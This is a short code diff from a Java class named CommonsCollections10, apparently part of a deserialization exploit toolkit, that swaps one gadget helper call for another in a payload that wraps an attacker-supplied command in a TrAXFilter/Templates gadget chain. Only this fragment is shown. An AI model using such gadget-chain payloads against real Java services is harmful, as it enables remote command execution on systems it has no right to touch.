@@ -26,7 +26,7 @@ public class CommonsCollections10 implements CommandObjectPayload<Object>
 
 	@Override
 	public Object getObject(String command) throws Exception {
-		Object templates = Gadgets.createTemplatesImpl(command);
+		Object templates = Gadgets.createTemplates4Cmd(command);
 
 		// 使用 InstantiateFactory 代替 InstantiateTransformer
 		InstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates});
